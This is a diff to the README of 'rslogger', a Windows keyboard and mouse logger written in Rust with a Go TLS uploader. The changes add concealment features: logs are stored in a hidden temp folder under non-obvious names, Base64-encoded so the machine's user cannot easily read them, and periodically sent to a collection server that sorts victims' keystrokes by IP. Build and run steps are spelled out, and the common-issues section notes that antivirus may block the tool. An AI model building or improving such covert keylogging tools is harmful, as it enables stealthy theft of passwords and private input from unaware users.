@@ -12,7 +12,10 @@ Keyboard and mouse logger written in Rust, with Go for network transfers over TL
 - **Automatic Upload**: Periodically sends logs to a remote server via TLS
 - **Single Binary**: Embedded Go sender for seamless operation
 - **Thread-Safe**: Mutex-protected file writes
-- **Windows Hooks**: Native low-level keyboard and mouse hooks
+- **Features**: 
+  - Hidden temp directory storage (`%TEMP%\.rsdata\`)
+  - Base64 encoded log files (unreadable in Notepad)
+  - Non-obvious filenames (`kb.dat`, `ms.dat`)
 
 ## Project Structure
 
@@ -30,7 +33,6 @@ rslogger/
 ├── server/                # Server (receiver) component
 │   ├── server.go         # Go TLS receiver
 │   └── go.mod            # Go module
-├── Makefile              # Unix build automation
 ├── build.ps1             # Windows build script
 └── README.md
 ```
@@ -40,12 +42,15 @@ rslogger/
 ### Client (`client/target/release/rslogger.exe`)
 - Logs keyboard and mouse activity
 - Embeds Go-compiled sender for TLS transmission
-- Saves logs locally: `keylog.txt` and `mouselog.txt`
+- Saves logs in hidden temp directory: `%TEMP%\.rsdata\kb.dat` and `%TEMP%\.rsdata\ms.dat`
+- Logs are Base64 encoded for obfuscation
 - Automatically uploads to server at configurable intervals
 
 ### Server (`server/server.exe`)
 - TLS listener on port 25557
-- Receives and stores files in `received/` directory
+- Receives and decodes Base64 files
+- Organizes files by sender IP: `data/<sender_ip>/`
+- Saves as readable text: `keyboard.txt` and `mouse.txt`
 - Self-signed certificate generation
 - Written in Go for high-performance networking
 
@@ -56,16 +61,34 @@ rslogger/
 - Go 1.20+
 - Windows (needs Windows API)
 
-**Easy way:**
+### Build Steps
+
+**Important:** You must build the Go sender executable first before building the Rust client!
+
+**Step 1: Build the Go sender**
 ```powershell
-.\build.ps1
+cd client\src
+go build -tags sender -ldflags="-s -w" -o sender.exe sender.go
+cd ..\..
 ```
 
-**Manual:**
+**Step 2: Build the Rust client**
 ```powershell
-go build -tags sender -ldflags="-s -w" -o client/src/sender.exe client/src/sender.go
-cd client && cargo build --release && cd ..
-cd server && go build -tags server -ldflags="-s -w" -o server.exe server.go && cd ..
+cd client
+cargo build --release
+cd ..
+```
+
+**Step 3: Build the Go server**
+```powershell
+cd server
+go build -tags server -ldflags="-s -w" -o server.exe server.go
+cd ..
+```
+
+**Easy way (PowerShell script):**
+```powershell
+.\build.ps1
 ```
 
 **With Make:**
@@ -83,29 +106,28 @@ make clean    # Clean build artifacts
 cd server
 .\server.exe
 ```
-Server runs on port 25557 and saves files to `received/` folder.
+Server runs on port 25557 and saves decoded files to `data/<sender_ip>/` folders with readable filenames (`keyboard.txt`, `mouse.txt`).
 
 ### Run Logger
 
 **Local only (no upload):**
 ```powershell
-cd client
-.\target\release\rslogger.exe
+cd client\target\release
+.\rslogger.exe
 ```
 
 **With upload:**
 ```powershell
-cd client
-.\target\release\rslogger.exe <server_ip>:25557 [seconds]
+cd client\target\release
+.\rslogger.exe <server_ip>:25557 [seconds]
 ```
 
 Example - upload every 5 minutes:
 ```powershell
-cd client
-.\target\release\rslogger.exe localhost:25557 300
+.\rslogger.exe 192.168.1.100:25557 300
 ```
 
-Run as Administrator or hooks won't work.
+**Run as Administrator** or hooks won't work.
 
 ## Configuration
 
@@ -123,29 +145,68 @@ listener, err := tls.Listen("tcp", ":25557", config)
 
 ## How it works
 
-**Rust side:**
-- Uses Windows hooks (`SetWindowsHookExW`)
+**Client side (Rust):**
+- Uses Windows hooks (`SetWindowsHookExW`) for keyboard and mouse
+- Stores logs in hidden temp directory: `%TEMP%\.rsdata\`
+- Encodes logs with Base64 to prevent easy reading
+- Files named `kb.dat` and `ms.dat` (non-obvious names)
 - Embeds Go sender binary at compile time
-- Extracts to temp and runs it for uploads
+- Extracts sender to temp and runs it for uploads
+- Periodically sends encoded logs to server
 
-**Go side:**
+**Server side (Go):**
 - TLS with self-signed certs (auto-generated)
-- Server handles multiple connections
+- Receives files and identifies sender by IP address
+- Creates folder per sender: `data/<ip>/`
+- Decodes Base64 back to plain text
+- Saves as `keyboard.txt` and `mouse.txt`
+- Handles multiple connections concurrently
+
+## File Storage
+
+**Client (target machine):**
+- Location: `%TEMP%\.rsdata\` (hidden folder)
+- Files: `kb.dat`, `ms.dat`
+- Format: Base64 encoded (unreadable in Notepad)
+
+**Server (collection machine):**
+- Location: `data/<sender_ip>/`
+- Files: `keyboard.txt`, `mouse.txt`
+- Format: Plain text (decoded)
+
+Example structure:
+```
+data/
+├── 192.168.1.100/
+│   ├── keyboard.txt
+│   └── mouse.txt
+├── 192.168.1.101/
+│   ├── keyboard.txt
+│   └── mouse.txt
+```
 
 ## Common Issues
 
 **Won't start:**
-- Run as admin
+- Run as admin (required for Windows hooks)
 - Antivirus might block it
 
 **Upload fails:**
 - Check server is running
 - Firewall on port 25557?
+- Verify server address is correct
 
 **Build fails:**
+- Did you build `sender.exe` first? (Step 1 above)
 - Go in PATH?
 - GCC installed? (`pacman -S mingw-w64-x86_64-gcc`)
-- Try `go mod tidy` in src/
+- Try `go mod tidy` in server/
+
+**Can't find log files:**
+- They're hidden! Go to `%TEMP%\.rsdata\`
+- Files are named `kb.dat` and `ms.dat`
+- They're Base64 encoded (won't be readable in Notepad)
+- Check server `data/<ip>/` folders for decoded logs
 
 ## License
 
